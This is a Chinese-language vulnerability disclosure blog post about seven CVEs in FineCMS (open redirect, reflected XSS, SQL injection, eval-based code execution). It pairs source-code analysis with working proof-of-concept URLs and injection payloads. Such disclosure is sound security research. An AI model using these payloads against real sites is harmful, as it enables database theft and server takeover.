---
title: finecms分析
date: 2017-07-26 10:30:09
tags:
- Blogs
- cve
- sqli
- xss
categories:
- Blogs
---

在过去的一段时间里，我对FineCMS公益版进行了一波比较详尽的审计，我们找到了包括SQL注入、php代码执行、反射性XSS、任意url跳转等前台漏洞，其中部分漏洞危害巨大。

CVE-2017-11581
CVE-2017-11582
CVE-2017-11583
CVE-2017-11584
CVE-2017-11585
CVE-2017-11586
CVE-2017-11629

更新至v5.0.11即可修复大部分漏洞

<!--more-->

# URL 任意跳转漏洞(CVE-2017-11586) #

## 漏洞分析 ##

`/finecms/dayrui/controllers/Weixin.php` 204~219 sync函数
```
    public function sync() {

        $url = urldecode($this->input->get('url'));
        if ($this->uid) {
            // 定向URL
            redirect($url, 'refresh');
            exit;
        } else {
            // 授权信息
            $url = 'https://open.weixin.qq.com/connect/oauth2/authorize?appid='.$this->wx['config']['key'].'&redirect_uri='.urlencode(SITE_URL.'index.php?c=weixin&m=member').'&response_type=code&scope=snsapi_base&state='.urlencode($url).'#wechat_redirect';
            redirect($url, 'refresh');
            exit;
        }


    }
```

当uid存在时，获取的url不做任何判断，直接进入跳转函数，这里uid存在的条件就是登陆，任意用户登陆即可。


## Poc ##

访问网站并登陆，然后访问（要求必须存在weixin模块，默认开启）
```
http://finecms.com/index.php?c=weixin&m=sync&url=http://www.baidu.com
```

![image.png-73.3kB][1]


# 登陆接口post型反射型xss(CVE-2017-11581) #

这里是一个前台直接攻击后台的储存型xss修复后的遗漏，下面我们跟一下漏洞原理。

## 漏洞分析 ##

`/finecms/dayrui/controllers/admin/Login.php` 17~57

![image.png-176.2kB][2]

当我们输入错误的后台登陆用户名和密码，输入的username会被过滤并返回到username中，让我们来看看username的过滤。

post函数获取的第二个参数是xss_clean，当xss_clean开启时，post会代入判断
```
	/**
	 * Fetch an item from the POST array
	 *
	 * @param	mixed	$index		Index for item to be fetched from $_POST
	 * @param	bool	$xss_clean	Whether to apply XSS filtering
	 * @return	mixed
	 */
	public function post($index = NULL, $xss_clean = NULL)
	{
		return $this->_fetch_from_array($_POST, $index, $xss_clean);
	}
```

file `/finecms/system/core/input.php` 226-228
```

return ($xss_clean === TRUE)
	? $this->security->xss_clean($value)
	: $value;
```

进入过滤逻辑

`/finecms/system/core/security.php` 470-489

![image.png-92.4kB][3]

这里的所有过滤都是以尖括号为开始的。

假设输入的username如果不包含左右尖括号，那么就不会有任何变化，那么我们正好可以使用dom xss执行js。

当我们输入`123"`登陆时
![image.png-33.3kB][4]

成功逃逸了双引号，那么一个反射性xss就成立了

## PoC ##

登陆使用下面的username
```
" onmousemove=alert`1` a="1
```

登陆失败后，移动鼠标就会触发

![image.png-48.2kB][5]

# 无限制前台反射性xss漏洞(CVE-2017-11629) #

这里本来是一个前台的任意函数执行，但是因为传入的是不可控数组，所以导致我不知道如何利用，仔细思考后被我改造成了反射性xss

## 漏洞分析 ##

`/finecms/dayrui/controllers/api.php` 145-165 data2函数

![image.png-182.3kB][6]

这里我们传入的所有参数都没有设置xss_clear，也就是说，这里的所有数据都是没有经过任何处理的。

这里的function参数本来是通过设置可以执行任意函数的，但是由于传入的data不可控还是数组，所以暂时想不到好的利用方法，但是突然发现如果函数不存在会直接输出在页面中。

于是这里形成了一个反射性xss。

## Poc ##

```
http://finecms.com/index.php?c=api&m=data2&function=<script>alert(1)</script>p&format=php
```
![image.png-45.9kB][7]

# Template.php catid变量 SQL注入漏洞(CVE-2017-11583) #

## 漏洞分析: ##

`/finecms/dayrui/controllers/api.php` 114 data2函数

首先我们要绕过安全码认证
```
$auth = $this->input->get('auth', true);
if ($auth != md5(SYS_KEY)) {
    // 授权认证码不正确
    $data = array('msg' => '授权认证码不正确', 'code' => 0);
} else {
```

这个安全码直接定义在config中，可以在后台被修改，会在cookie中被泄露

当我们第一次访问站点的时候，我们会获得cookie，这个前缀就是安全码

![image.png-79.7kB][8]

获取安全码MD5后进入函数list_tag，跟入 `/finecms/dayrui/libraries/Template.php` 402行。

![image.png-146.4kB][9]

param参数通过空格分割，然后解析分别赋值给system参数字典中，理论上这里是个变量覆盖漏洞。

通过这里，我们可以设置任意一个system变量。

通过构造形似
```
param=action=related
```
这样的请求来进入case，这里我们进入action=related

![image.png-202.3kB][10]

为了进入判断，我们必须传入catid，并且保证参数内存在逗号，这样catid的每一个值就会不经过任何变量过滤进入sql语句，形成注入。

这里有一个小问题就是不能使用空格和逗号，空格可以用换行符替代，逗号需要用一点儿黑科技，不过也不是很麻烦。

## PoC ##

打开网站并获取cookie中的SYS_KEY.

payload:
```
http://finecms.com/index.php?
c=api&m=data2&auth={md5(SYS_KEY)}&param=action=related%20module=news%20tag=1,2%20catid=1,12))%0aand%0a0%0aunion%0aselect%0a*%0afro
m(((((((((((((((((((select(user()))a)join(select(2))b)join(select(3))c)joi
n(select(4))d)join(select(5))e)join(select(6))f)join(select(7))g)join(sele
ct(8))h)join(select(9))i)join(select(10))j)join(select(11))k)join(select(1
2))l)join(select(13))m)join(select(14))n)join(select(15))o)join(select(16)
)p)join(select(17))q)join(select(18))x)%23
```

![image.png-65.2kB][11]

# Template.php num变量 SQL注入漏洞(CVE-2017-11582) #

## 漏洞分析: ##

这个漏洞前面部分的流程和上个漏洞触发方式相同，也是通过安全码，从data2函数进入list_tag函数，通过设置action=tags或者action=related。

`$system['num']` 参数存在limit注入，唯一的问题就是limit注入必须在5.0.0<mysql<5.6.6情况下才成立。

![image.png-56kB][12]

## PoC ##

打开网站并获取cookie中的SYS_KEY.

payload:
```
http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=related%2
0catid=1%20tag=1,2%20num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),con
cat(0x3a,version())),1)

http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=tags%2
0catid=1%20tag=1,2%20num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),con
cat(0x3a,version())),1)
```

# Template.php field变量 SQL注入漏洞(CVE-2017-11584) #

## 漏洞分析: ##

前面洞触发方式相同，通过安全码，从data2函数进入list_tag函数，设置`action=related`、`action=form`、`action=member`、`action=module`

这4部分有一个通用的`$system['field']`，这部分其实稍微有点儿奇怪，没做任何过滤就被直接拼接进入了SQL语句。

![image.png-59kB][13]

## PoC ##

每一个action进入语句的条件都不一定，这里贴上4个payload

```
http://finecms.com/index.php?c=api&m=data2&auth=820686a208b89d4c2f8b6f2622eff83e&param=action=related%20module=news%20tag=1%20field=1%0aunion%0aselect%0auser()%23
```
![image.png-40.6kB][14]

```
http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=form%20fo
rm=1%20field=1%0aunion%0aselect%0auser()%23
```
![image.png-42.4kB][15]

```
http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=member%20
field=1%0aunion%0aselect%0auser()%23
```
![image.png-30.6kB][16]

```
http://finecms.com/index.php?c=api&m=data2&auth=820686a208b89d4c2f8b6f2622eff83e&param=action=module%20form=1%20module=news%20field=1%0aunion%0aselect%0auser()%23
```
![image.png-34.3kB][17]

# eval injection导致的getshell(CVE-2017-11585) #

## Technical Description: ##

在list_tag函数中事实上产生的问题更多，当action=cache的时候

![image.png-296.2kB][18]

这部分其实触发挺简单的，只要保证每个步骤都存在就可以了，name这里需要设置MEMBER，我们可以跟过去看看`_cache_var`函数

```
public function _cache_var($name, $site = SITE_ID) {

    $data = NULL;
    $name = strtoupper($name);

    switch ($name) {
        case 'MEMBER':
            $data = $this->ci->get_cache('member');
            break;
        case 'URLRULE':
            $data = $this->ci->get_cache('urlrule');
            break;
        case 'MODULE':
            $data = $this->ci->get_cache('module');
            break;
        case 'CATEGORY':
            $site = $site ? $site : SITE_ID;
            $data = $this->ci->get_cache('category-'.$site);
            break;
        default:
            $data = $this->ci->get_cache($name.'-'.$site);
            break;
    }

    return $data;
}
```

只要保证有返回就好了，最后进入eval语句，要保证语法正确。

## PoC ##

打开网站并获取cookie中的SYS_KEY.

payload:

```
http://finecms.com/index.php?c=api&m=data2&auth=820686a208b89d4c2f8b6f2622eff83e&param=action=cache%20name=MEMBER.1'];phpinfo();$a=['1
```

![image.png-68kB][19]


  [1]: http://static.zybuluo.com/LoRexxar/bypfg8rxkludnscn6k7i06bx/image.png
  [2]: http://static.zybuluo.com/LoRexxar/p6rzdl3hn4qma2xfdnnjcvmf/image.png
  [3]: http://static.zybuluo.com/LoRexxar/k3pahve44l13aaq0l3tv804k/image.png
  [4]: http://static.zybuluo.com/LoRexxar/tdhgnnhca43s7luif2z0qt19/image.png
  [5]: http://static.zybuluo.com/LoRexxar/cta71z8vhzrdv5h9xgvyjirl/image.png
  [6]: http://static.zybuluo.com/LoRexxar/oxxa39k1ctnodcfdibrzk8mb/image.png
  [7]: http://static.zybuluo.com/LoRexxar/g6c9j510dmf41jqluwewf7lc/image.png
  [8]: http://static.zybuluo.com/LoRexxar/9uh4ll2w53s9ftnhdfaf5jv4/image.png
  [9]: http://static.zybuluo.com/LoRexxar/dwwtyb3okbfl0ohedg3q1z4h/image.png
  [10]: http://static.zybuluo.com/LoRexxar/3pt5zq0ezl29las6zgjmh7r5/image.png
  [11]: http://static.zybuluo.com/LoRexxar/g3fahvxj1u1628qhm6dwrelp/image.png
  [12]: http://static.zybuluo.com/LoRexxar/n7dbtbupmw8ukwwenp4lipjj/image.png
  [13]: http://static.zybuluo.com/LoRexxar/i8d3nn39drj9to4x24yzed3q/image.png
  [14]: http://static.zybuluo.com/LoRexxar/g111thw2rkktq201cdcy0vgj/image.png
  [15]: http://static.zybuluo.com/LoRexxar/uayzgncag8bh36fg9d8ii3fq/image.png
  [16]: http://static.zybuluo.com/LoRexxar/1k1qcb858g9jvsozo40sy35t/image.png
  [17]: http://static.zybuluo.com/LoRexxar/yfo0vsmibo19y94ld7kf6t00/image.png
  [18]: http://static.zybuluo.com/LoRexxar/y5pf6ackfl3e6hgodigz9icb/image.png
  [19]: http://static.zybuluo.com/LoRexxar/dyjq3635yf7ascfdxqmklyql/image.png